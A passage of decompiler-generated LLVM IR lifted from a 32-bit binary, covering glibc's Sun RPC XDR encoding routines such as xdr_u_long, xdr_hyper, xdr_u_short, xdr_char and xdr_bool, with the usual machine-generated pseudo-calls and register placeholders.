dec_label_pc_806468f:                             ; preds = %dec_label_pc_8064647, %dec_label_pc_806466d
  br label %dec_label_pc_8064691

dec_label_pc_8064691:                             ; preds = %dec_label_pc_8064647, %dec_label_pc_8064681, %dec_label_pc_8064653, %dec_label_pc_806468f
  %v0_8064695 = phi i32 [ 1, %dec_label_pc_8064647 ], [ 1, %dec_label_pc_8064681 ], [ %v2_806465f, %dec_label_pc_8064653 ], [ 0, %dec_label_pc_806468f ]
  %v2_8064694 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8064694, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8064695

; uselistorder directives
  uselistorder i32 %v2_806463e, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8064691, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_806468f, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8064696 = call i32 @__GI_xdr_long()
  ret i32 %v0_8064696
}

define i32 @xdr_u_long(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %tmp6, i32* @ecx, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_80646a7 = load i32, i32* %arg1, align 4
  %v9_80646a9 = icmp eq i32 %v2_80646a7, 1
  br i1 %v9_80646a9, label %dec_label_pc_80646bc, label %dec_label_pc_80646ae

dec_label_pc_80646ae:                             ; preds = %entry
  %v5_80646a9 = icmp eq i32 %v2_80646a7, 0
  br i1 %v5_80646a9, label %dec_label_pc_80646dd, label %dec_label_pc_80646b0

dec_label_pc_80646b0:                             ; preds = %dec_label_pc_80646ae
  %v9_80646b0 = icmp eq i32 %v2_80646a7, 2
  br i1 %v9_80646b0, label %dec_label_pc_80646ee, label %dec_label_pc_80646ec

dec_label_pc_80646bc:                             ; preds = %entry
  %v1_80646be = add i32 %tmp6, 4
  %v2_80646be = inttoptr i32 %v1_80646be to i32*
  %v3_80646be = load i32, i32* %v2_80646be, align 4
  %v5_80646c7 = inttoptr i32 %v3_80646be to i32*
  %v6_80646c7 = load i32, i32* %v5_80646c7, align 4
  call void @__pseudo_call(i32 %v6_80646c7)
  %v1_80646cc = icmp eq i32 %v3_80646be, 0
  br i1 %v1_80646cc, label %dec_label_pc_80646ec, label %dec_label_pc_80646d0

dec_label_pc_80646d0:                             ; preds = %dec_label_pc_80646bc
  %v1_80646d4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80646d4 = inttoptr i32 %v1_80646d4 to i32*
  br label %dec_label_pc_80646ee

dec_label_pc_80646dd:                             ; preds = %dec_label_pc_80646ae
  %v1_80646df = add i32 %tmp6, 4
  %v2_80646df = inttoptr i32 %v1_80646df to i32*
  %v3_80646df = load i32, i32* %v2_80646df, align 4
  %v5_80646e4 = add i32 %v3_80646df, 4
  %v6_80646e4 = inttoptr i32 %v5_80646e4 to i32*
  %v7_80646e4 = load i32, i32* %v6_80646e4, align 4
  call void @__pseudo_call(i32 %v7_80646e4)
  br label %dec_label_pc_80646ee

dec_label_pc_80646ec:                             ; preds = %dec_label_pc_80646b0, %dec_label_pc_80646bc
  br label %dec_label_pc_80646ee

dec_label_pc_80646ee:                             ; preds = %dec_label_pc_80646b0, %dec_label_pc_80646dd, %dec_label_pc_80646d0, %dec_label_pc_80646ec
  %v0_80646f2 = phi i32 [ 1, %dec_label_pc_80646b0 ], [ %v3_80646df, %dec_label_pc_80646dd ], [ 1, %dec_label_pc_80646d0 ], [ 0, %dec_label_pc_80646ec ]
  %v2_80646f1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80646f1, i32* @ebx, align 4
  ret i32 %v0_80646f2

; uselistorder directives
  uselistorder i32 %v2_80646a7, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80646ee, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80646ec, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v3_80646f3 = ptrtoint i32* %ulp to i32
  %v5_80646f3 = call i32 @xdr_u_long(i32* %xdrs, i32 %v3_80646f3)
  ret i32 %v5_80646f3
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_8064705 = inttoptr i32 %tmp7 to i32*
  %v2_8064705 = load i32, i32* %v1_8064705, align 4
  store i32 %v2_8064705, i32* %eax.global-to-local, align 4
  %v1_8064707 = icmp eq i32 %v2_8064705, 0
  %v1_8064709 = icmp eq i1 %v1_8064707, false
  br i1 %v1_8064709, label %dec_label_pc_8064749, label %dec_label_pc_8064731

dec_label_pc_8064731:                             ; preds = %entry
  %v1_806470b = add i32 %tmp6, 4
  %v2_806470b = inttoptr i32 %v1_806470b to i32*
  %v3_806470b = load i32, i32* %v2_806470b, align 4
  store i32 %v3_806470b, i32* %edx.global-to-local, align 4
  store i32 %v3_806470b, i32* %eax.global-to-local, align 4
  store i32 %v3_806470b, i32* %stack_var_-12, align 4
  %v1_8064714 = inttoptr i32 %tmp6 to i32*
  %v2_8064714 = load i32, i32* %v1_8064714, align 4
  store i32 %v2_8064714, i32* %eax.global-to-local, align 4
  %v1_806471c = add i32 %tmp7, 4
  %v2_806471c = inttoptr i32 %v1_806471c to i32*
  %v3_806471c = load i32, i32* %v2_806471c, align 4
  store i32 %v3_806471c, i32* %edx.global-to-local, align 4
  %v2_806471f = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_806471f, i32* %eax.global-to-local, align 4
  %v5_8064725 = add i32 %v3_806471c, 4
  %v6_8064725 = inttoptr i32 %v5_8064725 to i32*
  %v7_8064725 = load i32, i32* %v6_8064725, align 4
  call void @__pseudo_call(i32 %v7_8064725)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_8064731 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8064731, i32* %eax.global-to-local, align 4
  %v0_8064737 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064737 = add i32 %v0_8064737, 4
  %v2_8064737 = inttoptr i32 %v1_8064737 to i32*
  %v3_8064737 = load i32, i32* %v2_8064737, align 4
  store i32 %v3_8064737, i32* %edx.global-to-local, align 4
  %v5_806473c = add i32 %v3_8064737, 4
  %v6_806473c = inttoptr i32 %v5_806473c to i32*
  %v7_806473c = load i32, i32* %v6_806473c, align 4
  call void @__pseudo_call(i32 %v7_806473c)
  %v4_8064744 = and i32 %v2_8064731, -256
  %v5_8064744 = or i32 %v4_8064744, 1
  br label %dec_label_pc_806479d

dec_label_pc_8064749:                             ; preds = %entry
  %v9_8064749 = icmp eq i32 %v2_8064705, 1
  %v1_806474c = icmp eq i1 %v9_8064749, false
  br i1 %v1_806474c, label %dec_label_pc_8064797, label %dec_label_pc_806474e

dec_label_pc_806474e:                             ; preds = %dec_label_pc_8064749
  %v1_8064750 = add i32 %tmp7, 4
  %v2_8064750 = inttoptr i32 %v1_8064750 to i32*
  %v3_8064750 = load i32, i32* %v2_8064750, align 4
  store i32 %v3_8064750, i32* %eax.global-to-local, align 4
  %v2_8064753 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8064753, i32* %edx.global-to-local, align 4
  %v5_8064759 = inttoptr i32 %v3_8064750 to i32*
  %v6_8064759 = load i32, i32* %v5_8064759, align 4
  call void @__pseudo_call(i32 %v6_8064759)
  %v1_806475e = icmp eq i32 %v3_8064750, 0
  br i1 %v1_806475e, label %dec_label_pc_80647a2, label %dec_label_pc_8064776

dec_label_pc_8064776:                             ; preds = %dec_label_pc_806474e
  %v2_8064762 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8064762, i32* %eax.global-to-local, align 4
  %v0_8064768 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8064768 = add i32 %v0_8064768, 4
  %v2_8064768 = inttoptr i32 %v1_8064768 to i32*
  %v3_8064768 = load i32, i32* %v2_8064768, align 4
  store i32 %v3_8064768, i32* %edx.global-to-local, align 4
  %v5_806476d = inttoptr i32 %v3_8064768 to i32*
  %v6_806476d = load i32, i32* %v5_806476d, align 4
  call void @__pseudo_call(i32 %v6_806476d)
  %v3_8064776 = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8064781 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064781 = add i32 %v1_8064781, 4
  %v3_8064781 = inttoptr i32 %v2_8064781 to i32*
  store i32 %v3_8064776, i32* %v3_8064781, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8064789 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064789 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064789 = inttoptr i32 %v1_8064789 to i32*
  store i32 %v0_8064789, i32* %v2_8064789, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v0_806478f = load i32, i32* %esi.global-to-local, align 4
  %v1_806478f = inttoptr i32 %v0_806478f to i32*
  %v2_806478f = load i32, i32* %v1_806478f, align 4
  %v4_806478f = or i32 %v2_806478f, %tmp
  store i32 %v4_806478f, i32* %v1_806478f, align 4
  %v0_80647a7.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80647a4

dec_label_pc_8064797:                             ; preds = %dec_label_pc_8064749
  %v9_8064797 = icmp eq i32 %v2_8064705, 2
  %v1_806479a = zext i1 %v9_8064797 to i32
  %v3_806479a = and i32 %v2_8064705, -256
  %v4_806479a = or i32 %v1_806479a, %v3_806479a
  br label %dec_label_pc_806479d

dec_label_pc_806479d:                             ; preds = %dec_label_pc_8064731, %dec_label_pc_8064797
  %storemerge = phi i32 [ %v5_8064744, %dec_label_pc_8064731 ], [ %v4_806479a, %dec_label_pc_8064797 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_806479d = urem i32 %storemerge, 256
  store i32 %v1_806479d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80647a4

dec_label_pc_80647a2:                             ; preds = %dec_label_pc_806474e
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80647a4

dec_label_pc_80647a4:                             ; preds = %dec_label_pc_806479d, %dec_label_pc_8064776, %dec_label_pc_80647a2
  %v0_80647a7 = phi i32 [ %v1_806479d, %dec_label_pc_806479d ], [ %v0_80647a7.pre, %dec_label_pc_8064776 ], [ 0, %dec_label_pc_80647a2 ]
  store i32 %v0_80647a7, i32* %eax.global-to-local, align 4
  ret i32 %v0_80647a7

; uselistorder directives
  uselistorder i32 %v0_80647a7, { 1, 0 }
  uselistorder i32 %v1_806479d, { 1, 0 }
  uselistorder i32 %v2_8064705, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %dec_label_pc_80647a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806479d, { 1, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp7, i32* %ebx.global-to-local, align 4
  store i32 %tmp6, i32* %esi.global-to-local, align 4
  %v1_80647b9 = inttoptr i32 %tmp7 to i32*
  %v2_80647b9 = load i32, i32* %v1_80647b9, align 4
  store i32 %v2_80647b9, i32* %eax.global-to-local, align 4
  %v1_80647bb = icmp eq i32 %v2_80647b9, 0
  %v1_80647bd = icmp eq i1 %v1_80647bb, false
  br i1 %v1_80647bd, label %dec_label_pc_80647fb, label %dec_label_pc_80647e3

dec_label_pc_80647e3:                             ; preds = %entry
  %v1_80647bf = add i32 %tmp6, 4
  %v2_80647bf = inttoptr i32 %v1_80647bf to i32*
  %v3_80647bf = load i32, i32* %v2_80647bf, align 4
  store i32 %v3_80647bf, i32* %stack_var_-12, align 4
  %v2_80647cc = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_80647cc, i32* %eax.global-to-local, align 4
  %v1_80647d2 = add i32 %tmp7, 4
  %v2_80647d2 = inttoptr i32 %v1_80647d2 to i32*
  %v3_80647d2 = load i32, i32* %v2_80647d2, align 4
  store i32 %v3_80647d2, i32* %edx.global-to-local, align 4
  %v5_80647d7 = add i32 %v3_80647d2, 4
  %v6_80647d7 = inttoptr i32 %v5_80647d7 to i32*
  %v7_80647d7 = load i32, i32* %v6_80647d7, align 4
  call void @__pseudo_call(i32 %v7_80647d7)
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_80647e3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80647e3, i32* %eax.global-to-local, align 4
  %v0_80647e9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80647e9 = add i32 %v0_80647e9, 4
  %v2_80647e9 = inttoptr i32 %v1_80647e9 to i32*
  %v3_80647e9 = load i32, i32* %v2_80647e9, align 4
  store i32 %v3_80647e9, i32* %edx.global-to-local, align 4
  %v5_80647ee = add i32 %v3_80647e9, 4
  %v6_80647ee = inttoptr i32 %v5_80647ee to i32*
  %v7_80647ee = load i32, i32* %v6_80647ee, align 4
  call void @__pseudo_call(i32 %v7_80647ee)
  %v4_80647f6 = and i32 %v2_80647e3, -256
  %v5_80647f6 = or i32 %v4_80647f6, 1
  br label %dec_label_pc_8064851

dec_label_pc_80647fb:                             ; preds = %entry
  %v9_80647fb = icmp eq i32 %v2_80647b9, 1
  %v1_80647fe = icmp eq i1 %v9_80647fb, false
  br i1 %v1_80647fe, label %dec_label_pc_806484b, label %dec_label_pc_8064828

dec_label_pc_8064828:                             ; preds = %dec_label_pc_80647fb
  %v2_8064800 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8064800, i32* %eax.global-to-local, align 4
  %v1_8064806 = add i32 %tmp7, 4
  %v2_8064806 = inttoptr i32 %v1_8064806 to i32*
  %v3_8064806 = load i32, i32* %v2_8064806, align 4
  store i32 %v3_8064806, i32* %edx.global-to-local, align 4
  %v5_806480b = inttoptr i32 %v3_8064806 to i32*
  %v6_806480b = load i32, i32* %v5_806480b, align 4
  call void @__pseudo_call(i32 %v6_806480b)
  %v2_8064814 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8064814, i32* %eax.global-to-local, align 4
  %v0_806481a = load i32, i32* %ebx.global-to-local, align 4
  %v1_806481a = add i32 %v0_806481a, 4
  %v2_806481a = inttoptr i32 %v1_806481a to i32*
  %v3_806481a = load i32, i32* %v2_806481a, align 4
  store i32 %v3_806481a, i32* %edx.global-to-local, align 4
  %v5_806481f = inttoptr i32 %v3_806481a to i32*
  %v6_806481f = load i32, i32* %v5_806481f, align 4
  call void @__pseudo_call(i32 %v6_806481f)
  %v3_8064828 = load i32, i32* %stack_var_-20, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8064835 = load i32, i32* %esi.global-to-local, align 4
  %v2_8064835 = add i32 %v1_8064835, 4
  %v3_8064835 = inttoptr i32 %v2_8064835 to i32*
  store i32 %v3_8064828, i32* %v3_8064835, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_806483d = load i32, i32* %eax.global-to-local, align 4
  %v1_806483d = load i32, i32* %esi.global-to-local, align 4
  %v2_806483d = inttoptr i32 %v1_806483d to i32*
  store i32 %v0_806483d, i32* %v2_806483d, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v0_8064843 = load i32, i32* %esi.global-to-local, align 4
  %v1_8064843 = inttoptr i32 %v0_8064843 to i32*
  %v2_8064843 = load i32, i32* %v1_8064843, align 4
  %v4_8064843 = or i32 %v2_8064843, %tmp
  store i32 %v4_8064843, i32* %v1_8064843, align 4
  %v0_806485b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064858

dec_label_pc_806484b:                             ; preds = %dec_label_pc_80647fb
  %v9_806484b = icmp eq i32 %v2_80647b9, 2
  %v1_806484e = zext i1 %v9_806484b to i32
  %v3_806484e = and i32 %v2_80647b9, -256
  %v4_806484e = or i32 %v1_806484e, %v3_806484e
  br label %dec_label_pc_8064851

dec_label_pc_8064851:                             ; preds = %dec_label_pc_80647e3, %dec_label_pc_806484b
  %storemerge = phi i32 [ %v5_80647f6, %dec_label_pc_80647e3 ], [ %v4_806484e, %dec_label_pc_806484b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8064851 = urem i32 %storemerge, 256
  store i32 %v1_8064851, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064858

dec_label_pc_8064858:                             ; preds = %dec_label_pc_8064851, %dec_label_pc_8064828
  %v0_806485b = phi i32 [ %v1_8064851, %dec_label_pc_8064851 ], [ %v0_806485b.pre, %dec_label_pc_8064828 ]
  store i32 %v0_806485b, i32* %eax.global-to-local, align 4
  ret i32 %v0_806485b

; uselistorder directives
  uselistorder i32 %v0_806485b, { 1, 0 }
  uselistorder i32 %v1_8064851, { 1, 0 }
  uselistorder i32 %v2_80647b9, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-12, { 1, 2, 0 }
  uselistorder i32 %tmp7, { 0, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder label %dec_label_pc_8064851, { 1, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_8064860 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_8064860
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_8064865 = call i32 @xdr_u_hyper()
  ret i32 %v0_8064865
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %tmp10 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8064876 = load i32, i32* %arg1, align 4
  %v9_8064878 = icmp eq i32 %v2_8064876, 1
  br i1 %v9_8064878, label %dec_label_pc_80648a5, label %dec_label_pc_806487d

dec_label_pc_806487d:                             ; preds = %entry
  %v5_8064878 = icmp eq i32 %v2_8064876, 0
  br i1 %v5_8064878, label %dec_label_pc_806488b, label %dec_label_pc_806487f

dec_label_pc_806487f:                             ; preds = %dec_label_pc_806487d
  %v9_806487f = icmp eq i32 %v2_8064876, 2
  store i32 1, i32* %eax.global-to-local, align 4
  br i1 %v9_806487f, label %dec_label_pc_80648c9, label %dec_label_pc_80648c7

dec_label_pc_806488b:                             ; preds = %dec_label_pc_806487d
  %v1_806488b = inttoptr i32 %arg2 to i16*
  %v2_806488b = load i16, i16* %v1_806488b, align 2
  %v3_806488b = zext i16 %v2_806488b to i32
  store i32 %v3_806488b, i32* %stack_var_-8, align 4
  %v2_8064892 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_8064892, i32* %eax.global-to-local, align 4
  %v1_8064898 = add i32 %tmp10, 4
  %v2_8064898 = inttoptr i32 %v1_8064898 to i32*
  %v3_8064898 = load i32, i32* %v2_8064898, align 4
  %v5_806489d = add i32 %v3_8064898, 4
  %v6_806489d = inttoptr i32 %v5_806489d to i32*
  %v7_806489d = load i32, i32* %v6_806489d, align 4
  call void @__pseudo_call(i32 %v7_806489d)
  %v0_80648cd.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80648c9

dec_label_pc_80648a5:                             ; preds = %entry
  %v2_80648a5 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_80648a5, i32* %eax.global-to-local, align 4
  %v1_80648ab = add i32 %tmp10, 4
  %v2_80648ab = inttoptr i32 %v1_80648ab to i32*
  %v3_80648ab = load i32, i32* %v2_80648ab, align 4
  %v5_80648b0 = inttoptr i32 %v3_80648ab to i32*
  %v6_80648b0 = load i32, i32* %v5_80648b0, align 4
  call void @__pseudo_call(i32 %v6_80648b0)
  %v0_80648b5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80648b5 = icmp eq i32 %v0_80648b5, 0
  br i1 %v1_80648b5, label %dec_label_pc_80648c7, label %dec_label_pc_80648b9

dec_label_pc_80648b9:                             ; preds = %dec_label_pc_80648a5
  %v2_80648bd = load i32, i32* %ebx.global-to-local, align 4
  %v3_80648bd = inttoptr i32 %v2_80648bd to i16*
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80648c9

dec_label_pc_80648c7:                             ; preds = %dec_label_pc_806487f, %dec_label_pc_80648a5
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80648c9

dec_label_pc_80648c9:                             ; preds = %dec_label_pc_806487f, %dec_label_pc_80648b9, %dec_label_pc_806488b, %dec_label_pc_80648c7
  %v0_80648cd = phi i32 [ 1, %dec_label_pc_806487f ], [ 1, %dec_label_pc_80648b9 ], [ %v0_80648cd.pre, %dec_label_pc_806488b ], [ 0, %dec_label_pc_80648c7 ]
  %v2_80648cc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80648cc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80648cd

; uselistorder directives
  uselistorder i32 %v2_8064876, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_80648c9, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80648c7, { 1, 0 }
}

define i32 @xdr_char(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80648ce = load i32, i32* @ebx, align 4
  store i32 %v0_80648ce, i32* %stack_var_-4, align 4
  %v4_80648d2 = ptrtoint i8* %arg2 to i32
  store i32 %v4_80648d2, i32* %ebx.global-to-local, align 4
  %v2_80648d6 = load i8, i8* %arg2, align 1
  store i8 %v2_80648d6, i8* %stack_var_-8, align 1
  %v2_80648dd = ptrtoint i8* %stack_var_-8 to i32
  %v2_80648e6 = call i32 @__GI_xdr_int(i32 %arg1, i32 %v2_80648dd)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80648f0 = icmp eq i32 %v2_80648e6, 0
  br i1 %v1_80648f0, label %dec_label_pc_80648fc, label %dec_label_pc_80648f4

dec_label_pc_80648f4:                             ; preds = %entry
  %v3_80648f4 = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_80648fa = load i32, i32* %ebx.global-to-local, align 4
  %v3_80648fa = inttoptr i32 %v2_80648fa to i8*
  store i8 %v3_80648f4, i8* %v3_80648fa, align 1
  %v0_80648ff.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80648fc

dec_label_pc_80648fc:                             ; preds = %entry, %dec_label_pc_80648f4
  %v0_80648ff = phi i32 [ 0, %entry ], [ %v0_80648ff.pre, %dec_label_pc_80648f4 ]
  %v2_8064901 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8064901, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80648ff

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80648fc, { 1, 0 }
}

define i32 @xdr_u_char(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i8, align 1
  %v2_806490b = load i8, i8* %tmp7, align 1
  store i8 %v2_806490b, i8* %stack_var_-8, align 1
  %v2_8064912 = ptrtoint i8* %stack_var_-8 to i32
  store i32 %v2_8064912, i32* @eax, align 4
  %v5_806491b = call i32 @xdr_u_long(i32* %arg1, i32 %v2_8064912)
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8064925 = icmp eq i32 %v5_806491b, 0
  br i1 %v1_8064925, label %dec_label_pc_8064931, label %dec_label_pc_8064929

dec_label_pc_8064929:                             ; preds = %entry
  %v3_8064929 = load i8, i8* %stack_var_-8, align 1
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_806492f = load i32, i32* @ebx, align 4
  %v3_806492f = inttoptr i32 %v2_806492f to i8*
  store i8 %v3_8064929, i8* %v3_806492f, align 1
  %v0_8064934.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8064931

dec_label_pc_8064931:                             ; preds = %entry, %dec_label_pc_8064929
  %v0_8064934 = phi i32 [ 0, %entry ], [ %v0_8064934.pre, %dec_label_pc_8064929 ]
  ret i32 %v0_8064934

; uselistorder directives
  uselistorder i8* %stack_var_-8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8064931, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v2_8064944 = load i32, i32* %arg1, align 4
  %v9_8064946 = icmp eq i32 %v2_8064944, 1
  br i1 %v9_8064946, label %dec_label_pc_8064978, label %dec_label_pc_806494b

dec_label_pc_806494b:                             ; preds = %entry
  %v5_8064946 = icmp eq i32 %v2_8064944, 0
  br i1 %v5_8064946, label %dec_label_pc_8064959, label %dec_label_pc_806494d

dec_label_pc_806494d:                             ; preds = %dec_label_pc_806494b
  %v9_806494d = icmp eq i32 %v2_8064944, 2
  br i1 %v9_806494d, label %dec_label_pc_80649a1, label %dec_label_pc_806499f

dec_label_pc_8064959:                             ; preds = %dec_label_pc_806494b
  %v1_806495b = inttoptr i32 %arg2 to i32*
  %v2_806495b = load i32, i32* %v1_806495b, align 4
  %v3_806495b = icmp eq i32 %v2_806495b, 0
  %v1_806495e = icmp eq i1 %v3_806495b, false
  %v2_806495e = zext i1 %v1_806495e to i32
  store i32 %v2_806495e, i32* %stack_var_-8, align 4
  %v1_8064967 = add i32 %tmp6, 4
  %v2_8064967 = inttoptr i32 %v1_8064967 to i32*
  %v3_8064967 = load i32, i32* %v2_8064967, align 4
  %v2_806496a = ptrtoint i32* %stack_var_-8 to i32
  %v5_8064970 = add i32 %v3_8064967, 4
  %v6_8064970 = inttoptr i32 %v5_8064970 to i32*
  %v7_8064970 = load i32, i32* %v6_8064970, align 4
  call void @__pseudo_call(i32 %v7_8064970)
  br label %dec_label_pc_80649a1

dec_label_pc_8064978:                             ; preds = %entry
  %v1_806497a = add i32 %tmp6, 4
  %v2_806497a = inttoptr i32 %v1_806497a to i32*
  %v3_806497a = load i32, i32* %v2_806497a, align 4
  %v5_8064983 = inttoptr i32 %v3_806497a to i32*
  %v6_8064983 = load i32, i32* %v5_8064983, align 4
  call void @__pseudo_call(i32 %v6_8064983)
  %v1_8064988 = icmp eq i32 %v3_806497a, 0
  br i1 %v1_8064988, label %dec_label_pc_806499f, label %dec_label_pc_806498c

dec_label_pc_806498c:                             ; preds = %dec_label_pc_8064978
  %v4_806498e = icmp eq i32 %tmp, 0
  %v1_8064993 = icmp eq i1 %v4_806498e, false
  %v2_8064993 = zext i1 %v1_8064993 to i32
  %v1_8064996 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8064996 = inttoptr i32 %v1_8064996 to i32*
  store i32 %v2_8064993, i32* %v2_8064996, align 4
  br label %dec_label_pc_80649a1

dec_label_pc_806499f:                             ; preds = %dec_label_pc_806494d, %dec_label_pc_8064978
  br label %dec_label_pc_80649a1

dec_label_pc_80649a1:                             ; preds = %dec_label_pc_806494d, %dec_label_pc_806498c, %dec_label_pc_8064959, %dec_label_pc_806499f
  %v0_80649a5 = phi i32 [ 1, %dec_label_pc_806494d ], [ 1, %dec_label_pc_806498c ], [ %v2_806496a, %dec_label_pc_8064959 ], [ 0, %dec_label_pc_806499f ]
  %v2_80649a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80649a4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80649a5

; uselistorder directives
  uselistorder i32 %v2_8064944, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80649a1, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_806499f, { 1, 0 }
}

define i32 @xdr_enum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_80649a6 = call i32 @__GI_xdr_long()
  ret i32 %v0_80649a6
}

define i32 @xdr_opaque(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
